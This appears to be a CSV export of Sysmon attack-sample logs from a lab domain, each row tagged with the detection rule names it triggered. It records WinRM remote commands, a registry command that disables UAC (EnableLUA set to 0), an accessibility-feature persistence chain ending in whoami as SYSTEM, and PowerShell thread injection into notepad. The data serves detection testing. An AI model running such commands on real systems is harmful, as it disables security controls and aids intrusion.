2019-05-16T01:31:36.426870+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_winrm_exec_sysmon_1_winrshost.evtx,1,Microsoft-Windows-Sysmon,1,17984,DC1.insecurebank.local,"Image: C:\Windows\System32\winrshost.exe
RuleName: ''
Description: Host Process for WinRM's Remote Shell plugin
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 580
LogonGuid: DFAE8213-BD78-5CDC-0000-002005FE1200
Hashes: SHA1=E25A9835F02E2149C6153DA3DF3D680BA7442B37,MD5=C4FFB616FE5B81E61F70073732CBBB81,SHA256=8142A15194183BAB9FE1967ABD0961D633D6030D3753099A67150F9C4AB6D4FB,IMPHASH=C92CADF837D82C0615FEC138C16A9D40
ParentProcessGuid: DFAE8213-BB19-5CDC-0000-001003760000
ProcessId: 3948
CurrentDirectory: C:\Windows\system32\
ProcessGuid: DFAE8213-BD78-5CDC-0000-0010C7FE1200
CommandLine: C:\Windows\system32\WinrsHost.exe -Embedding
FileVersion: 6.3.9600.17415 (winblue_r4.141028-1500)
User: insecurebank\Administrator
LogonId: '0x12fe05'
IntegrityLevel: High
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-16 01:31:36.408
"
2019-05-16T01:31:36.454892+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Potential Lateral Movement via Windows Remote Shell;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_winrm_exec_sysmon_1_winrshost.evtx,1,Microsoft-Windows-Sysmon,1,17985,DC1.insecurebank.local,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\WinrsHost.exe -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3948
LogonGuid: DFAE8213-BD78-5CDC-0000-002005FE1200
Hashes: SHA1=7C3D7281E1151FE4127923F4B4C3CD36438E1A12,MD5=F5AE03DE0AD60F5B17B82F2CD68402FE,SHA256=6F88FB88FFB0F1D5465C2826E5B4F523598B1B8378377C8378FFEBC171BAD18B,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3
ParentProcessGuid: DFAE8213-BD78-5CDC-0000-0010C7FE1200
ProcessId: 3136
CurrentDirectory: C:\Users\administrator\
ProcessGuid: DFAE8213-BD78-5CDC-0000-001091041300
CommandLine: C:\Windows\system32\cmd.exe /C ipconfig
FileVersion: 6.3.9600.16384 (winblue_rtm.130821-1623)
User: insecurebank\Administrator
LogonId: '0x12fe05'
IntegrityLevel: High
ParentImage: C:\Windows\System32\winrshost.exe
UtcTime: 2019-05-16 01:31:36.443
"
2019-05-16T01:31:36.456891+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_winrm_exec_sysmon_1_winrshost.evtx,1,Microsoft-Windows-Sysmon,1,17986,DC1.insecurebank.local,"Image: C:\Windows\System32\ipconfig.exe
RuleName: ''
Description: IP Configuration Utility
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\cmd.exe /C ipconfig
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3136
LogonGuid: DFAE8213-BD78-5CDC-0000-002005FE1200
Hashes: SHA1=588D711E3D5F141987BF2C1B397C59EF1997C0E1,MD5=BF379376C124B19A7535CBA8EA179802,SHA256=21E8B9BD30650E96C36E976AE35B01E409199C244E6A5480A746692C01D78B84,IMPHASH=AA00C6A177971304329C748A6D5820DB
ParentProcessGuid: DFAE8213-BD78-5CDC-0000-001091041300
ProcessId: 1744
CurrentDirectory: C:\Users\administrator\
ProcessGuid: DFAE8213-BD78-5CDC-0000-001074051300
CommandLine: ipconfig
FileVersion: 6.3.9600.16384 (winblue_rtm.130821-1623)
User: insecurebank\Administrator
LogonId: '0x12fe05'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-16 01:31:36.447
"
2019-05-16T01:38:19.630865+00:00,Hacktool - EDR-Freeze Execution;Remote PowerShell Session Host Process (WinRM);Suspicious Execution of Hostname;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_PowershellRemoting_sysmon_1_wsmprovhost.evtx,1,Microsoft-Windows-Sysmon,1,18002,DC1.insecurebank.local,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: Lateral Movement - Windows Remote Management
Description: Hostname APP
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3332
LogonGuid: DFAE8213-BEAD-5CDC-0000-0020AFDA1500
Hashes: SHA1=4ED8B225C9CC97DD02C9A5DFD9F733C353F83E36,MD5=74D1E6E8AC6ABCC1DE934C8C5E422B64,SHA256=CA40BB9470E8E73767F3AA43DDF51F814481167DEC6C2FAA1996C18AB2C621DB,IMPHASH=65F157041816229C2919A683CBA86F70
ParentProcessGuid: DFAE8213-BEAD-5CDC-0000-0010DDDB1500
ProcessId: 2936
CurrentDirectory: C:\Users\administrator\Documents\
ProcessGuid: DFAE8213-BF0B-5CDC-0000-00105A951600
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 6.3.9600.16384 (winblue_rtm.130821-1623)
User: insecurebank\Administrator
LogonId: '0x15daaf'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wsmprovhost.exe
UtcTime: 2019-05-16 01:38:19.616
"
2019-05-16T14:17:15.762708+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Defense Evasion/DE_UAC_Disabled_Sysmon_12_13.evtx,1,Microsoft-Windows-Sysmon,1,18617,DC1.insecurebank.local,"Image: C:\Windows\System32\reg.exe
RuleName: technique_id=T1112,technique_name=Modify Registry
Description: Registry Console Tool
TerminalSessionId: 2
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3748
LogonGuid: DFAE8213-7002-5CDD-0000-0020E6850500
Hashes: SHA1=0873F40DE395DE017495ED5C7E693AFB55E9F867,MD5=A3F446F1E2B8C6ECE56F608FB32B8DC6,SHA256=849F54DC526EA18D59ABAF4904CB11BC15B982D2952B971F2E1B6FBF8C974B39,IMPHASH=A069A88BBB8016324D7EC0A0EEC459EB
ParentProcessGuid: DFAE8213-702C-5CDD-0000-0010E8C50600
ProcessId: 3788
CurrentDirectory: C:\
ProcessGuid: DFAE8213-70EB-5CDD-0000-0010F66D0A00
CommandLine: reg  add hklm\software\microsoft\windows\currentversion\policies\system /v EnableLUA /t REG_DWORD /d 0x0 /f
FileVersion: 6.3.9600.16384 (winblue_rtm.130821-1623)
User: insecurebank\Administrator
LogonId: '0x585e6'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-16 14:17:15.753
"
2019-05-16T14:17:15.763712+00:00,Service Binary in Suspicious Folder;UAC Disabled,data/EVTX-ATTACK-SAMPLES/Defense Evasion/DE_UAC_Disabled_Sysmon_12_13.evtx,1,Microsoft-Windows-Sysmon,13,18619,DC1.insecurebank.local,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\EnableLUA
RuleName: technique_id=T1088,technique_name=Bypass User Account Control
EventType: SetValue
ProcessId: 3788
ProcessGuid: DFAE8213-70EB-5CDD-0000-0010F66D0A00
UtcTime: 2019-05-16 14:17:15.758
Details: DWORD (0x00000000)
"
2019-05-16T16:08:34.867569+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/persistence_accessibility_features_osk_sysmon1.evtx,1,Microsoft-Windows-Sysmon,1,18917,DC1.insecurebank.local,"Image: C:\Windows\System32\osk.exe
RuleName: technique_id=T1015,technique_name=Accessibility Features
Description: Windows Command Processor
TerminalSessionId: 2
ParentCommandLine: utilman.exe /debug
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1112
LogonGuid: DFAE8213-832F-5CDD-0000-0020E7030000
Hashes: SHA1=7C3D7281E1151FE4127923F4B4C3CD36438E1A12,MD5=F5AE03DE0AD60F5B17B82F2CD68402FE,SHA256=6F88FB88FFB0F1D5465C2826E5B4F523598B1B8378377C8378FFEBC171BAD18B,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3
ParentProcessGuid: DFAE8213-8B00-5CDD-0000-001043C20A00
ProcessId: 1720
CurrentDirectory: C:\Windows\system32\
ProcessGuid: DFAE8213-8B02-5CDD-0000-00109BCA0A00
CommandLine: '""C:\Windows\System32\osk.exe""  '
FileVersion: 6.3.9600.17415 (winblue_r4.141028-1500)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\Utilman.exe
UtcTime: 2019-05-16 16:08:34.853
"
2019-05-16T16:08:40.360593+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process;Whoami.EXE Execution Anomaly;Whoami.EXE Execution From Privileged Process,data/EVTX-ATTACK-SAMPLES/Persistence/persistence_accessibility_features_osk_sysmon1.evtx,1,Microsoft-Windows-Sysmon,1,18918,DC1.insecurebank.local,"Image: C:\Windows\System32\whoami.exe
RuleName: technique_id=T1033,technique_name=System Owner/User Discovery
Description: whoami - displays logged on user information
TerminalSessionId: 2
ParentCommandLine: '""C:\Windows\System32\osk.exe""  '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1720
LogonGuid: DFAE8213-832F-5CDD-0000-0020E7030000
Hashes: SHA1=E06B89D9B87A8A4E5A8B7A5307C3BA88E0A01D41,MD5=D609D59A042C04A50EB41EC5D52F7471,SHA256=16C4CEE8C7BF4070E25A32F0B95857FA5CEC51E47D246E6FBAD69887460961B2,IMPHASH=98A3BC461E82881A801A12AAA668BD47
ParentProcessGuid: DFAE8213-8B02-5CDD-0000-00109BCA0A00
ProcessId: 3764
CurrentDirectory: C:\Windows\system32\
ProcessGuid: DFAE8213-8B08-5CDD-0000-001011CE0A00
CommandLine: whoami
FileVersion: 6.3.9600.16384 (winblue_rtm.130821-1623)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\osk.exe
UtcTime: 2019-05-16 16:08:40.350
"
2019-05-18T17:16:16.176921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18650,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1364
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.176
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.208171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18651,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2752
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.208
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.223796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18652,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2788
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.223
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.255046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18653,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2820
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.239
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.270671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18654,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2824
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.270
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.286296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18655,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2812
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.286
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.317546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18656,IEWIN7,"TargetProcessId: 2840
NewThreadId: 332
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.317
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.333171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18657,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1560
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.333
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.348796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18658,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1584
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.348
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.364421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18659,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1612
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.364
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.380046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18660,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1660
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.380
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.395671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18661,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2860
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.395
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.411296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18662,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2808
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.411
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.426921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18663,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1692
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.426
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.458171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18664,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1672
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.458
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.473796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18665,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1268
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.458
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.489421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18666,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1152
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.489
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.505046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18667,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1856
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.505
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.520671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18668,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1248
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.520
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.536296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18669,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1004
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.536
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.551921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18670,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1096
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.551
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.567546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18671,IEWIN7,"TargetProcessId: 2840
NewThreadId: 800
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.567
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.583171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18672,IEWIN7,"TargetProcessId: 2840
NewThreadId: 912
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.583
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.598796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18673,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1484
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.598
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.614421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18674,IEWIN7,"TargetProcessId: 2840
NewThreadId: 740
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.614
TargetImage: C:\Windows\System32\notepad.exe
"
